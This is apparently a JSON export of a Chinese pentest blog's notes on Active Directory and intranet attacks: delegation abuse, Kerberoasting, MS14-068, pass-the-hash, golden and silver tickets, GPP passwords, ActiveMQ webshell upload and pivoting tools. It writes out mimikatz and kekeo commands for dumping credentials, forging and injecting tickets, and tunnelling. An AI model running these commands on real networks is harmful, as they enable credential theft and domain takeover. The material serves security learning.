不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。\nS4U2proxy:\n 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。 service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。 service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。 service2 响应步骤 8 的请求。 service1 响应用户对步骤 5 中的请求。  当被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION(T2A4D)，且 msDS-AllowedToDelegateTo 属性会被设置为某些特定协议。\n\r\n 注意：\n如果 AD 中将用户标记为“帐户敏感且无法委派”，则无法模拟其身份。\n 实战 约束委派查找  adfind  查询约束委派的主机：\nAdFind.exe -b \u0026quot;DC=pentest,DC=com\u0026quot; -f \u0026quot;(\u0026amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))\u0026quot; cn distinguishedName msds-allowedtodelegateto\r\r\n查询约束委派的用户：\nAdFind.exe -b \u0026quot;DC=pentest,DC=com\u0026quot; -f \u0026quot;(\u0026amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))\u0026quot; cn distinguishedName msds-allowedtodelegateto\r powerview  查询约束委派的主机：\nGet-DomainComputer -TrustedToAuth -Domain test.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto\r查询约束委派的用户：\nGet-DomainUser –TrustedToAuth -domain qiyou.com -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl\r利用 已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务，是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者NTLM hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST。\n 抓取主机账户或服务账户的NTLM值 或 以其他渠道(kerberosating攻击)获取到服务账户密码  mimikatz.exe \u0026quot;privilege::debug\u0026quot; \u0026quot;sekurlsa::logonpasswords full\u0026quot; exit\r\r\n 申请TGT(如果已经有服务账户所在主机的权限，可以直接使用mimikatz从内存中把服务账户的TGT导出，从而省略申请TGT过程)  kekeo.exe tgt::ask /user:win7$ /domain:pentest.com /ntlm:\u0026lt;抓取到的哈希\u0026gt;\rtgt::ask /user:win7$ /domain:pentest.com /password:123456\r\r\n 通过 TGT，伪造S4U请求一张以 Administrator 用户身份访问对应服务 2（DC 的 cifs 服务）的 ST  tgs::s4u /tgt:TGT_win7$@PENTEST.COM_krbtgt~pentest.com@PENTEST.COM.kirbi /user:administrator@pentest.com /service:cifs/dc.pentest.com\r\r\nS4U2Self获取到的 ST1 以及 S4U2Proxy 获取到的 DC CIFS 服务的 ST2 会保存在当前目录下：\n\r\n mimikatz 注入ST2到当前会话  kerberos::ptt TGS_administrator@pentest.com@PENTEST.COM_cifs~dc.pentest.com@PENTEST.COM.kirbi\r委派服务受限 \r\n当允许的服务不是CIFS服务，可以在 hex 模式下修改 ST2，将 time 修改为 cifs，即可通过 smbexec 执行命令。\n","date":"2021-12-15T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-13/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-13/","title":"基于域委派的攻击"},{"content":"Activemq 任意文件写入漏洞 简介 ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。\nfileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：其使用率并不高，并且文件操作容易出现漏洞。\n所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf/jetty.xml中开启）；在5.14.0版本以后，彻底删除了fileserver应用。\n漏洞详情 漏洞编号：\nCVE-2016-3088\n本漏洞出现在fileserver应用中，本质就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。\n一般利用方式为写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。\n利用 尝试写webshell，但是默认是不进行解析，所以如果有弱口令直接登录admin或api，将文件移动到可解析目录即可。\n 访问8161端口  \r\n 访问admin目录，尝试默认口令：admin:admin  \r\n\r\n 访问admin/test/systemProperties.jsp目录查看信息  \r\n 使用fileserver上传webshell  \r\n 使用MOVE方法移动到可解析的目录  \r\n 访问webshell，此时涉及到登录，添加HTTP basic Authorization头，蚁剑连接  \r\n","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/%E5%A4%8D%E7%8E%B0-2/","title":"Activemq 任意文件写入漏洞"},{"content":"Kerberosating 攻击 第九节-Kerberosating攻击 背景 Kerberoasting 攻击是 Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后，不少研究人员对 Kerberoasting 进行了改进和扩展，在 GitHub 上开发发布了大量工具，使得 Kerberoasting 逐渐发展成为域攻击的常用方法之一。\n攻击原理 kerberos 协议的认证授权过程，3 次涉及使用不同账户的 NTLM 作为密钥加密数据：\n 使用域用户的 NTLM 加密认证请求票据 KDC 使用 Krbtgt 账号的 NTLM 加密认证后的票据 TGT KDC 使用运行服务的服务账号的 NTLM 加密授权票据 TGS  Kerberos 使用公开的对称加密算法，如 rc4_hmac_nt 等:\ny = f(x, key)\n  x为待加密的数据，包含时间戳和其它固定格式的内容\n  key为加密密钥，即 NTLM\n  y 为加密后的密数据\n  如果能从 Kerberos 域网络中获取 y，则根据已知算法，使用不同的 f，并配合口令字典可推算出不同的 x。\n由于 x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的 key 是否为要寻找的口令。\nkey 越简单、加密算法 f强度越低，被破解的概率越大，因此需要寻找具有简单 key的账号，以及使用较低强度的加密算法 f。\n域内账号类型 在域内主要有主机账号、用户账号、服务账号(SPN 注册在域用户账号下) 3 种主要账号类型。\n 主机账号的口令由系统随机设置，几乎不能破解，而且每 30 天自动变更一次 用户账号口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大 服务账号的口令存在很大特殊性  口令在应用软件安装时往往自动设定，复杂度往往较低 口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行 MSSQL服务的 sqlsvc 账号等    服务账号满足口令复杂度较低这个条件，可以作为破解的对象。\n要想达成破解条件，还需要获取加密后的数据，则需获取服务账号的密数据：\n由于 TGS 由服务账号的 NTLM 加密，因此获取访问服务的 TGS 即可获取密数据，即 Kerberos 协议中的第 4 步。\n 根据 Kerberos 协议，任何用户均可以向域服务器申请访问某个服务；而TGS的获取是前四步，server不参与，因此该服务可以不在线，只要该服务在域中注册了 SPN(Service Principal Name) 即可。\n SPN 简介 SPN 是服务器上所运行服务的唯一标识，每个使用 Kerberos 的服务都需要一个 SPN。\n  SPN 分为两种：一种注册在 AD 上**机器帐户(Computers)下，另一种注册在域用户帐户(Users)**下\n  当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户(Computers)下\n  当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户(Users)下\n  SPN的格式：serviceclass/host:port/servicename\n 其中 serviceclass 表示服务的种类，例如 www 表示web服务 host 尽量用 FQDN 表示 端口如果是知名端口，可以省略  例如MSSQL服务：\n\r\n查询SPN账号 SPN 存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有 SPN 服务。因为主机账号的口令几乎不能破解，所以只查询用户账号的 SPN。\n系统提供了 PowerShell 模块供查询，PowerViewer 对模块进行了封装，提供 Get-DomainUser -SPN 命令，可遍历域内所有的用户账号的 SPN。\n\r\nWin7 和 Windows Server 2008 自带的工具：\n setspn.exe -q */*  一些域中，当一些服务不再运行或者停止服务后，这些服务账号可能仍然遗留在域中，由于服务的运行与否不影响获取 TGS，因此这些不存在的 SPN 仍然适用于 Kerberoasting。例如：Exchange。\n服务账号中有些权限较高，例如有些特殊的服务需要具备域管理员权限的服务账号才能运行正常，因此可以在查询 SPN 时加以标记和筛选，作为重点攻击的对象。方法是在使用 Get-DomainUser -SPN 命令时，添加 AdminCount 参数，表示具备高权限。\n\r\n攻击  获取域内服务账号与所运行的服务的对应关系 获取访问这些服务的TGS，即获取由服务账号 NTLM 加密的加密数据，使用mimikatz工具的Kerberos 模块的 ask 命令  \r\n使用 Mimikatz 每次只能申请获取一个 TGS，impacket 工具包提供了批量获取的方法，可一次获取域内所有 SPN 的 TGS，供离线批量破解。\n微软为了解决系统新旧版本兼容性问题，每个 Windows 系统会支持多种加密算法，例如 AES、DES、RC4、MD5 等。在 Windows 2003、Windows 2000 系统中，主要采用 RC4、MD5、HMAC_MD5 等算法，这些算法相对比较容易破解。所以在选择破解重点时，尽量选取运行在这些系统上的服务。\n 有多种方式迫使系统选择使用强度较低的加密算法。现在比较容易破解的算法是 RC4_HMAC_NT 算法，在获取 TGS 时，可以诱使域服务器采用该算法进行加密。例如mimikatz工具就会告诉KDC我所支持的加密算法就是RC4_HMAC_NT 等，诱使域服务器采用该算法进行加密。\n 总结 Kerberoasting 攻击的所有条件：\n 密数据 算法 口令字典库  Tim Medin 的 kerberoast 工具破解获取口令，使用 tgsrepcrack.py wordlist.txt tgs.kirbi 进行破解，其中 wordlist.txt 是字典文件，tgs.kirbi 是之前获取的 TGS。破解的概率和时间依赖于口令复杂度、字典以及机器的性能。\n当然还有算法更快的 HashCat 工具。\nKerberoasting 攻击后续 破解所服务账号的口令后，接下来就是如何利用账号实现对域的控制。\n默认情况下，服务账号不允许以交互式方式登录域，只允许网络登录或以服务方式登录。\n 如果服务账号对应服务仍在正常使用，可构造类似白银票据进行伪造TGS，宣称以管理员访问服务账号所在的服务，进而获取该服务完全控制权 如果对应服务不存在，往往要使用服务账号访问其他服务，一般也可获取高权限  在Windows系统中，许多服务在服务器具有较高权限。例如MSSQL服务在服务器上具有本地管理员权限，如果以域管理员身份访问该服务，既可以控制服务本身，又可获取服务器本地管理员权限，并且，在这类服务器上，往往也留有高权限用户的登录凭证，获取这些凭证进而快速获取域控制权。\nKerberoasting 攻击例外 有时候存在这样的账号，他不要求进行Kerberos预身份验证，那么根据TGS密数据去破解口令的方式不适用，但是这类账户可能也有弱口令现象，同样可使用Kerberoasting破解用户账号口令。\n可使用ARP欺骗，获取用户登录时的AS-REP包，然后离线破解。之所以要在用户登录时窃听，是因为根据Kerberos协议，使用用户NTLM进行加密的情景只出现在用户登录认证时候。\n防御  提高服务账号的口令复杂度 尽量将域内的服务器系统升级至少至 windows2008 系统，应用 AES256 高难度的加密算法  检测Kerberoasting 攻击还是比较困难，因为执行攻击所做的操作都是合法常规操作。但也可从以下方面进行检测：\n 批量获取 TGS 声明使用低强度的加密算法  ","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-5/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-5/","title":"Kerberosating 攻击"},{"content":"MS14-068 漏洞分析 简介 2014.11.18 日，微软发布 MS14-068 补丁，修复了一个影响全部版本 Windows 服务器的严重漏洞。用于解决 Microsoft Windows Kerberos KDC 漏洞，该漏洞允许黑客任意普通用户提升权限成为域管理员身份。攻击者可以利用这些提升的权限控制域中所有的计算机，包括域服务器。\n原理 Kerberos 认证流程 \r\nServer如何判断Client的该有什么样的权限？\nServer 收到 Client 发来的 TGS 后，要根据 TGS 中 Client 申明所在的域组，和 Server 上的 ACL 进行比对，然后决定给予 Client 什么样的资源访问权限。微软使用 PAC 来表示 TGS 中 Client 申明的域组。\nPAC PAC (Privilege Attribute Certificate)，特权属性证书。PAC 包含 Client 的 User 的 SID、Group 的 SID。PAC 决定了 Client 的组属性，即决定了 Client 的权限。\n PAC 中 Group 的 SID 决定了 Client 权限。\n PAC 为了保证自身的合法性，还包含 2 个签名，Key 为 krbtgt 的 NTLM，签名的内容除了 User SID、Group SID 外，还包括其他部分。\nPAC 作为 TGT 的一部分，是加密的，密钥为 krbtgt 的 NTLM。\n\r\nClient 向 KDC 的 AS 模块发起认证请求，AS 返回 TGT 时，会根据 Client 所在的组，生成 PAC，包含 Client 的 User SID、Group SID，以及用于确保 PAC 不被篡改的 2 个签名。将 PAC 作为 TGT 的一部分，发送给 Client。\nClient 使用 TGT 向 KDC 的 TGS 模块发起访问 Server 服务时，KDC 的 TGS 模块首先解密TGT，并通过校验 2 个签名，以验证 PAC 的合法性。如果通过验证，KDC 的 TGS 模块用 2 个新的签名替代老的签名来保证 PAC 不被篡改。第一个签名的密钥为 Server 的 NTLM，第二个密钥为 Server 与 Client 的临时会话密钥（Server Session Key）。\n重新签名后的 PAC 被放置在签发的访问票据 TGS 中，并使用 Server 的 NTLM 作为密钥加密TGS。Server 收到来自 Client 的 TGS 后，解密 TGS 验证合法性，校验 PAC 中的 2 个签名，确认 PAC 的合法性，然后确认 Client 的访问权限。\n漏洞成因 Client 在发起认证请求时，通过设置 include-PAC 为 False，则返回的 TGT 中不会包含 PAC。\n\r\n\r\n 第一个原因  KDC 对 PAC 进行验证时，对于 PAC 尾部的签名算法，虽然RFC上规定必须是带有 Key 的签名算法才可以，但微软在实现上，允许任意签名算法，只要客户端指定任意签名算法，KDC 服务器就会使用指定的算法进行签名验证。因此，伪造的任意内容都可以是合法的，直接加上内容的值作为签名即可。\n 第二个原因  当设置了 include-PAC 为false，返回的TGT没有 PAC，随后构造一个假的PAC和TGT一并发送给 KDC， KDC 在收到TGT 和 PAC 后，仍然能够正确解析出没有放在 TGT 中的 PAC 信息。\nPAC 必须是密文，经过 Key 加密的，所以 KDC 会从 收到的TGT 中取出 Session Key，把 PAC 信息解密并利用客户端设定的签名算法验证签名。\n 第三个原因  KDC 先验证缺少 PAC 的 TGT， 成功后，再去验证不在 TGT 中的 PAC 的合法性。如果 2 个均验证成功，KDC 把 PAC 中的 User SID、Group SID 取出来，重新使用进行签名，签名算法和密钥与设置 inclue-pac 标志位为 TRUE 时一模一样。将新产生的 PAC 加入到解密后的 TGT 中，再重新加密制作全新的 TGT 发送给 Client，注意不是 TGS。\n利用流程：\n 发送 as-req，并且 include-PAC 为false 客户端收到 TGT(不带 PAC)，利用 Session Key 构造一个假的 PAC(声明自己为域管)，并指明签名算法，最后和 TGT 一起发送给KDC(TGS-req) KDC 会先验证 TGT ，再验证我们伪造的 PAC，均验证成功后，就会按照i nclue-pac = True 时的情况正常进行 kerberos 流程 最后返回给我们一个正常的声明为域管的合法 TGT 注入票据即可  利用  基于 MS14-068 制作TGT票据  \r\n 使用 mimikatz 导入票据  mimikatz.exe \u0026quot;kerberos::ptc TGT_eviluser@testlab.com.ccache” exit \r\n 访问目标 c 盘目录  \r\n","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-9/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-9/","title":"MS14-068 漏洞分析"},{"content":"PTH 攻击 定义 PTH(Pass The Hash)\n当获取到某主机本地管理员组成员账号的口令NTLM后，不需要破解获取口令明文，使用PTH方式将管理员账号及NTLM注入当前到当前会话并作为凭据，利用该凭据可渗透获取周围主机管理权限。适用于工作组环境和域环境。\n条件  对方主机需存在相同的账号，且是管理员组成员 初始机子上需要获取系统权限，才能进行会话注入  UAC 用户帐户控制 (User Account Control) 是 Windows Vista（及更高版本操作系统）中一组新的基础结构技术，可以帮助阻止恶意程序损坏系统，同时也可以帮助组织部署更易于管理的平台。 使用 UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。\n用户帐户控制(UAC)是新版 Windows 的核心安全功能，也是其最常被人误解的众多安全功能当中的一种。\n在UAC下，一个用户是目标机器上的本地管理员组的成员，当他建立远程管理连接时，他无法获取完全管理员权限，也无法权限提升和执行管理员任务等。要想获取完全管理员权限，只能通过远程助手或远程桌面连入目标机器。\n HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorToken  在Admin Approval Mode模式下用户打开cmd会话，会判断权限，如果要打开完全管理员cmd，就要求进行认证和确认。\nUAC就是通过上面的注册表键值来判断所获取会话的初始权限，默认设置为 0。如果设置为 1，则即使 SID 为 500 的管理员也不能通过网络登录的方式获取高权限。\n HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy  如果在注册表中有这个键值，并且设置为 1，则所有的管理组成员都可以通过网络登录获取高权限。而且会忽视上面的一个表项 FilterAdministratorToken 的值。\n利用 在Windows NT 5.x(2003、2005)系统中，管理员组账号的网络登录(例如IPC方式)都获取系统管理权限。\n而在Windows NT 6.x系统及更高版本中，管理员组(SID非500)账号网络登录后不能获取系统管理权限，除非是administrator(SID=500)。\n工作组环境  先用mimikatz获取本地管理员组成员的NTLM，并记录  privilege::debug\rlsadump::lsa /patch  PTH攻击  sekurlsa::pth /user:administrator /domain:workgroup /ntlm:xxx\r 微软已经针对PTH进行修复过，实际测试中发现，管理员组(SID非500)账号网络登录PTH已经无法成功，而 Administrator (SID 500) 账号仍然可行。\n  攻击成功后会回弹一个会话，即cmd  域环境  获取当前域内用户的NTLM PTH攻击：对另外一个域的目标计算机(他所在域用户是他本地管理员组成员，且账号密码相同)执行PTH  sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:xxx\r 获取完全管理员会话   注意：\n工作组环境下，会受上述注册表两值的影响；\n而在域环境下不受影响。\n MSF 中的 PTH exploit/windows/smb/psexec\r补丁-KB2871997 目的 阻止使用本地账户网络登录和远程交互式登录到一台加入到域内服务器的机器上。\n修复结果 安装 KB2871997 补丁后，其他方面并没有太多的变化 。\n补丁会给本地账号添加一个 S-1-5-113 的 SID，为管理员组中的本地账号添加一个 S-1-5-114 的 SID，这样方便通过域策略进行管理，例如从域策略中全面禁止这类账号的网络登录。\n针对RDP的Hash传递攻击 说起 hash 传递攻击（pth），想到一般的都是 psexec wce mimikatz 等直接执行命令。\n本节绍了一种利用 mimikatz + NThash 来启动 mstsc.exe 实现远程登陆 Windows 桌面的方法，对不能执行命令又破解不出密码的环境有很大的帮助。\n其原理（条件）是远程目标需要使用受限管理模式（Restricted Admin Mode），因为此模式下支持 kerberos 认证，所以能使用 hash 来登陆。\n 受限模式被禁用情况下，使用如下命令开启  # 启动powershell\rmimikatz.exe \u0026quot;sekurlsa::pth /user:\u0026lt;user name\u0026gt; /domain:\u0026lt;domain name\u0026gt; /ntlm:\u0026lt;the user's ntlm hash\u0026gt; /run:powershell.exe\u0026quot;\r# 在powershell中修改注册表\rEnter-PSSession -Computer \u0026lt;Target\u0026gt;\rNew-ItemProperty -Path \u0026quot;HKLM:\\System\\CurrentControlSet\\Control\\Lsa\u0026quot; -Name \u0026quot;DisableRestrictedAdmin\u0026quot; -Value \u0026quot;0\u0026quot; -PropertyType DWORD -Force\r PTH攻击  sekurlsa::pth /user:\u0026lt;user name\u0026gt; /domain:\u0026lt;domain name\u0026gt; /ntlm:\u0026lt;the user's ntlm hash\u0026gt; /run:\u0026quot;mstsc.exe /restrictedadmin\u0026quot;\r","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-4/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-4/","title":"PTH 攻击"},{"content":"内网代理转发 假如有这样的环境：\n外网服务器存在双网卡，内网服务器不可访问公网但可以直接和外网服务器进行通信。基于这个场景，攻击者以外网服务器作为跳板，对内网服务器进行继续渗透。\n端口转发类 Lcx 本地端口转发 防火墙等访问控制策略：不允许公网直接访问3389端口，此时可以尝试 lcx 的本地转发功能将其转发到其他端口。\n 先上传 lcx.exe 至外网服务器，执行如下  lcx.exe -tran 8888 127.0.0.1 3389\r# 将本地8888端口流量转发到本地3389端口\r# 攻击者直接连接外网服务器8888端口\r正向端口转发 拿下外网服务器权限和内网服务器账号密码，尝试直接访问内网的3389端口。\n 外网服务器执行  lcx.exe -tran 8888 192.168.77.2 3389\r# 将本地8888端口流量转发到内网机器3389端口\r# 攻击者直接连接外网服务器8888端口\r反向端口转发 拿下外网服务器和内网服务器的权限，并知道内网服务器账号密码。攻击者想要连接内网服务器的3389服务，但是防火墙规则，不允许外网服务器直接访问它。\n可尝试在内网机器上将内网端口主动转发到外网服务器，随后攻击者连接外网服务器即可。\n 外网服务器监听在7777端口，并本地转发到8888端口  lcx.exe -listen 7777 8888\r 内网服务器主动反向连接外网服务器7777端口，并转发本地的3389端口流量  lcx.exe -slave 192.168.77.1 7777 127.0.0.1 3389\r 攻击者连接外网服务器8888端口即可  Linux 下的Lcx portmap就是Linux下的lcx，需要手动上传 c 文件，并进行编译使用。\n 将流量正向转发到外网服务器的3389端口  ./portmap -m l -p1 8888 -h2 192.168.77.2 -p2 3389\rNetsh Netsh 是 Windows 自带的命令行脚本工具，它可以建立端口映射。与 Lcx 不同，netsh 不支持反向的端口转发。\n本地端口转发 netsh interface portproxy add v4tov4 listenport=8888 connectaddress=192.168.77.1 connectport=3389 # 删除策略\rnetsh interface portproxy delete v4tov4 listenport=8888\r正向端口转发 Netshinterface portproxy add v4tov4 listenaddress=192.168.77.1 8888 connectaddress=192.168.77.2 connectport=3389\r# 删除策略\rNetsh interface portproxy delete v4tov4 listenport=8888 listenaddress=192.168.77.1\rSSH 本地端口转发 在本地主机 Host A 上开启端口流量转发\n# 本地执行\rssh -L 8866:192.168.10.3:23 -fN username@192.168.10.2\r\r\n远程端口转发 在远程主机 Host B 上开启端口流量转发\n# 在HostB上执行\rssh -R 8866:192.168.10.3:23 -fN username@192.168.10.1\r\r\nSOCKS 代理类 reGeorg reGeorg是一款把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP通信的工具。\n 上传 tunnerl 文件 攻击机运行：  python reGeorgSocksProxy.py -p 8080 -u http://ip:port/tunnel/tunnel.jsp\r 使用其他渗透工具时配置 socks 代理为本地8080端口即可 或者 使用Proxifier配置全局代理(Windows)、proxychains(Linux)   注意：Socks协议通过TCP协议进行数据传输，因而不提供如传递 ICMP 信息之类的网络层相关服务，ping测试会发现不通。\n Neo-reGeorg reGeorg稳定性不太好，且容易被杀，Neo-reGeorg 是一个旨在积极重构 reGeorg 的项目。\n 提高 tunnel 连接安全性 提高可用性，避免特征检测 提高传输内容保密性 应对更多的网络环境场景  基本使用：\n 设置密码生成 tunnel并上传到WEB服务器  python neoreg.py generate -k password\r 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理  python neoreg.py -k password -u http://xx/tunnel.php\rfrp frp 采用 Golang 编写，支持跨平台，仅需下载对应平台的二进制文件即可执行。\n 服务端启动(在自己 VPS上 )  ./frps -c ./frps.ini\r[common]\rbind_port = 7000\rBind_addr = 0.0.0.0\rdashboard_port = 7500 # 仪表盘端口\rdashboard_user = admin # 仪表盘账号与密码\rdashboard_pwd = passadmin\r 客户端启动(在获取到权限的跳板服务器上)  ./frpc -c ./frpc.ini\r[common]\rserver_addr = # VPS 地址\rserver_port = 7000\r[plugin_socks]\rtype = tcp\rremote_port = 46075\rplugin = socks5\rplugin_user = admin\rplugin_passwd = admin123\ruse_encryption = true\ruse_compression = true\r","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-8/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-8/","title":"内网代理转发"},{"content":"组策略相关 本地组策略和域内组策略   Server Manager 的组策略管理工具：主要用来管理本地内的组策略\n  更专业的组策略管理工具GPMC：可以管理多个域\n  组策略分作主机策略和用户策略，machine和users目录； 脚本类型和非脚本类型, script目录\n  域服务器如何存储组策略 存储在服务器中，\\domain\\sysvol\\policies，以明文方式存储为xml、ini、inf等文件。对域内所有用户开放读权限。\n\r\n组策略更新  客户端每90分钟主动获取一次组策略，检查组策略是否发生变更 客户端使用gpupdate /force强制立即检查组策略；参数可以分为主机和用户，gpupdate /force /target:computer  组策略的下发与获取 组策略的查询原理：\n LDAP检索所有的组策略，哪些是属于自己的，服务器决定需要返回哪些策略（版本号是决定的重要因素）\n过程：\n Kerberos协议认证 LDAP协议去查询 SMB协议去获取并下发  组策略中的口令明文 某些场景下，需要批量给域内主机改口令、添加共享磁盘等，因此会编写一些脚本去做，比如VB脚本，而执行上述某些功能(VB脚本中的操作)是需要域管理员的口令，为了以脚本形式批量操作，会把口令明文直接放在脚本中。\n\r\n在2008、12、16等，已经不存在这种明文形式了，因为系统管理方式发生变化。\n组策略中的口令密文 微软收购\u0026quot;PolicyMaker\u0026quot;，在Win 2008中发布了GPP(Group Policy Preferences)。对于某些仍然需要用户凭证的场景，例如下列，GPP实现会在xml等文件中留下口令经AES加密过后的密文。\n 映射驱动(Drivers.xml) 创建本地用户 数据源(DataSources.xml) 创建/更新服务(Services.xml) 计划任务(ScheduledTasks.xml) 更改Administrator密码 打印机配置(Printers.xml)  \r\n最关键的是，经研究发现，其所使用的AES加密密钥是固定不变的，即所有涉及这些场景口令的加密密钥都是一样的：\n\r\n因此，本地所存放的密文等同于明文。\nPowerSploit中提供GET-GPPPassword模块去获取组策略中的口令：\n\r\n2008上仍然有效，由于存在这样的问题，微软在2012、2016已经取消GPP这种方式。\n组策略攻击客户端 背景 当域内某**客户端开启防火墙，或者关闭Server服务(445端口)**后，攻击者则无法直接进入域内某客户端。这时候可尝试通过组策略攻击客户端。\n组策略更新   当一个客户端登录进域后，它会查询自己所在组是否有组策略更新，如果有更新就会执行更新内容，比如执行脚本等。\n  使用gpupdate命令强行主动更新组策略\n  利用 因此在拿到域控制权后，而无法直接进入域内客户端情况下，可以更改目标客户端用户的组策略，以实现：用户登录时，下载恶意文件并执行，以取得控制权。\n思考：为啥不直接改策略把445开启？是因为445开启相关的组策略不是启动更新，必须强制更新？\n","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-3/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-3/","title":"组策略相关"},{"content":"黄金票据 BlackHat 2014上， Mimikatz的作者剖析了微软实现的Kerberos协议中存在的安全缺陷，即黄金票据（Golden Ticket） ，对应的有白银票据（Silver Ticket）。由于是协议实现过程中的设计逻辑缺陷，没有补丁。影响全系列Windows系统，包括最新版Windows 2016。\n构造原理 \r\n构造条件  krbtgt账号的NTLM  域升级、重装才会自动改变NTLM 连续2次修改口令才会激发系统随机重置krbtgt账号的NTLM 有的域自从安装后，再未变更过krbtgt账号的NTLM   域SID  任意一台域内主机均可获取\n 有域内主机  获取krbtgt账户的NTLM mimikatz.exe \u0026quot;privilege::debug\u0026quot; \u0026quot;1sadump::1sa /patch\u0026quot; exit \u0026gt; 2.txt\r# 域内任何主机都可，但是cmd环境得是域内用户\rmimikatz.exe \u0026quot;privilege::debug\u0026quot; \u0026quot;1sadump::dcsync /user:krbtgt@adsec.com\u0026quot; exit \u0026gt; hash.txt\r获取域SID  Get-DomainSID  \r\n 查看注册表  \r\n制作 mimikatz.exe \u0026quot;kerberos::golden /user:anyusername /domain:adsec.com /sid:S-1-5-21-2732272027-1570987391-2638982533 /krbtgt:16ed27ee7848756cfa96b33c25e3ad3d /ptt\u0026quot; exit\r\r\n实际上这里dir命令访问的就是目标主机上的CIFS服务(SMB)，而黄金票据攻击之后，本地已经缓存好TGT，所以访问服务时便可正常进行TGS的申请和使用等等。\n 黄金票据攻击成功后，发现使用域名去访问目标是可行的，但是以IP方式访问目标却被拒绝。\n这是因为以域名访问表明用的是Kerberos协议，IP访问则表明用的是NTLM协议，而黄金票据是基于Kerberos协议的漏洞。\n 黄金票据攻击后访问服务所产生的日志 Win Server 2016\n\r\n\r\n白银票据   最常见的是利用主机账号NTLM做白银票据，以最高权限访问主机服务（HOST等服务）\n  其次是利用服务账号NTLM做白银票据，以最高权限访问服务\n  mimikatz.exe \u0026quot;kerberos::golden /user:anyusername /domain:adsec.com /sid:S-1-5-21-2732272027-10987391-2638982533 /target:win2016-dc01.adsec.com /rc4:9cf82blec7cab3b4c7bf18b53569d188 /service:cifs /ptt\u0026quot; exit\r\r\n","date":"2021-11-02T00:00:00Z","image":"https://coollllllll.github.io/p/intranet-7/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/intranet-7/","title":"黄金票据、白银票据"},{"content":"ACL 相关 Access Control Link   所有的Windows对象都称为安全对象，文件、进程、注册表、内存等\n  为每个安全对象赋予一个安全描述符(Security descriptor)\n  Security identifiers (SIDs)for the owner and primary group of an object\n  A DACL that specifies the access rights allowed or denied to particular users or groups\n  A SACL that specifies the types of access attempts that generate audit records for the object\n  DACL DACL由多个ACE(Access Control Entry)组成。\n\r\nWindows的访问控制 Windows的访问控制包括三部分:访问令牌、对象安全描述符和访问检查。\n 访问令牌作为一个容器，通过Token体现 对象安全描述符表示目标对象的安全属性，通过安全矩阵详细描述该对象赋予不同用户组的权限 访问检查表示通过比较访问令牌和ACL，以决定该进程是否具有访问时申请的相应权限  